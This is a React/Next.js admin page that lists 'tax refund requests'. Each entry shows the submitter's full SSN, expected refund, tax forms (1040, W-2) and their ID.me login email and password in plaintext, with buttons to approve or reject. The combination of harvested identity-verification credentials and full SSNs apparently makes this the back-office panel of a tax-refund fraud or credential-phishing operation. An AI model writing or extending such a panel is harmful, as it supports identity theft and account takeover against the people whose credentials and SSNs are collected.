"use client";

import React, { useState, useEffect } from 'react';
import { 
  ShieldCheck, CheckCircle, XCircle, FileText, Loader2, 
  DollarSign, MapPin, User, Eye, Lock, Key, Mail
} from 'lucide-react';
import AdminGuard from '../../../components/AdminGuard';
import Link from 'next/link';

export default function AdminTaxPage() {
  const [requests, setRequests] = useState([]);
  const [loading, setLoading] = useState(true);
  const [processingId, setProcessingId] = useState(null);

  useEffect(() => { fetchRequests(); }, []);

  const fetchRequests = async () => {
    try {
      const res = await fetch('/api/admin/tax');
      if (res.ok) setRequests(await res.json());
    } catch (error) { console.error(error); } 
    finally { setLoading(false); }
  };

  const handleAction = async (id, status) => {
    setProcessingId(id);
    try {
        const res = await fetch('/api/admin/tax', {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id, status })
        });
        if (res.ok) setRequests(requests.map(r => r.id === id ? { ...r, status } : r));
    } catch (e) { console.error(e); }
    finally { setProcessingId(null); }
  };

  return (
    <AdminGuard>
      <div className="min-h-screen bg-slate-50 flex">
        <aside className="w-64 bg-slate-900 text-slate-300 flex flex-col fixed h-full p-4">
             <h2 className="text-xl font-bold text-white mb-8 pl-4">ADMIN<span className="text-blue-500">PANEL</span></h2>
             <Link href="/admin" className="mb-4 px-4 hover:text-white transition">← Back to Dashboard</Link>
        </aside>

        <main className="flex-1 ml-64 p-8">
            <h1 className="text-2xl font-bold text-slate-900 mb-6">Tax Refund Requests</h1>
            
            {loading ? <div className="flex justify-center pt-20"><Loader2 className="animate-spin text-blue-600" size={40}/></div> : (
                <div className="space-y-6">
                    {requests.map(req => (
                        <div key={req.id} className="bg-white p-6 rounded-2xl shadow-sm border border-slate-200">
                            
                            {/* HEADER */}
                            <div className="flex justify-between items-start mb-6 border-b border-slate-100 pb-4">
                                <div className="flex items-center gap-4">
                                    <div className="w-12 h-12 bg-purple-100 text-purple-600 rounded-full flex items-center justify-center font-bold text-lg">
                                        {req.fullName[0]}
                                    </div>
                                    <div>
                                        <h3 className="font-bold text-slate-900 text-lg">{req.fullName}</h3>
                                        <p className="text-sm text-slate-500">{req.user.email}</p>
                                    </div>
                                </div>
                                <span className={`px-4 py-1.5 rounded-full text-xs font-bold uppercase ${req.status === 'APPROVED' ? 'bg-green-100 text-green-700' : req.status === 'REJECTED' ? 'bg-red-100 text-red-700' : 'bg-yellow-100 text-yellow-700'}`}>
                                    {req.status}
                                </span>
                            </div>

                            {/* SENSITIVE DATA GRID */}
                            <div className="grid grid-cols-2 md:grid-cols-3 gap-4 mb-6 bg-slate-50 p-4 rounded-xl border border-slate-100">
                                <div>
                                    <p className="text-[10px] text-slate-400 font-bold uppercase mb-1">SSN (Full)</p>
                                    <p className="font-mono font-bold text-slate-900 tracking-wider">{req.ssn}</p>
                                </div>
                                <div>
                                    <p className="text-[10px] text-slate-400 font-bold uppercase mb-1">Expected Refund</p>
                                    <p className="font-bold text-green-600">${req.refundAmount.toLocaleString()}</p>
                                </div>
                                <div>
                                    <p className="text-[10px] text-slate-400 font-bold uppercase mb-1">Country</p>
                                    <p className="font-bold text-slate-900 flex items-center gap-1"><MapPin size={14}/> {req.country}</p>
                                </div>
                            </div>

                            {/* ID.ME CREDENTIALS */}
                            <div className="mb-6 p-4 border border-red-100 bg-red-50/50 rounded-xl">
                                <h4 className="text-xs font-bold text-red-500 uppercase mb-3 flex items-center gap-2"><Lock size={14}/> ID.me Credentials</h4>
                                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                    <div className="flex items-center gap-2">
                                        <Mail size={16} className="text-slate-400"/>
                                        <span className="font-mono text-sm text-slate-700">{req.idMeEmail}</span>
                                    </div>
                                    <div className="flex items-center gap-2">
                                        <Key size={16} className="text-slate-400"/>
                                        <span className="font-mono text-sm text-slate-700">{req.idMePassword}</span>
                                    </div>
                                </div>
                            </div>

                            {/* DOCUMENTS */}
                            <div className="mb-6">
                                <h4 className="text-xs font-bold text-slate-400 uppercase mb-3 flex items-center gap-2"><FileText size={14}/> Tax Forms</h4>
                                <div className="flex gap-4">
                                    {[{l:'Form 1040', f: req.form1040}, {l:'W-2 Form', f: req.w2}].map((doc, i) => (
                                        doc.f ? (
                                            <a key={i} href={doc.f} target="_blank" className="flex items-center gap-2 px-4 py-2 bg-blue-50 text-blue-600 rounded-lg text-xs font-bold hover:bg-blue-100 transition">
                                                <Eye size={14}/> View {doc.l}
                                            </a>
                                        ) : <span key={i} className="text-xs text-slate-400 italic">No {doc.l}</span>
                                    ))}
                                </div>
                            </div>

                            {/* ACTIONS */}
                            {req.status === 'PENDING' && (
                                <div className="flex gap-3 pt-4 border-t border-slate-100">
                                    <button onClick={() => handleAction(req.id, 'REJECTED')} disabled={!!processingId} className="px-4 py-2 border border-red-200 text-red-600 rounded-lg font-bold hover:bg-red-50 transition flex items-center gap-2">
                                        {processingId === req.id ? <Loader2 className="animate-spin" size={16}/> : <XCircle size={18}/>} Reject
                                    </button>
                                    <button onClick={() => handleAction(req.id, 'APPROVED')} disabled={!!processingId} className="px-6 py-2 bg-green-600 text-white rounded-lg font-bold hover:bg-green-700 transition flex items-center gap-2 shadow-lg shadow-green-200">
                                        {processingId === req.id ? <Loader2 className="animate-spin" size={16}/> : <CheckCircle size={18}/>} Approve
                                    </button>
                                </div>
                            )}
                        </div>
                    ))}
                    {requests.length === 0 && <p className="text-center text-slate-400">No tax requests found.</p>}
                </div>
            )}
        </main>
      </div>
    </AdminGuard>
  );
}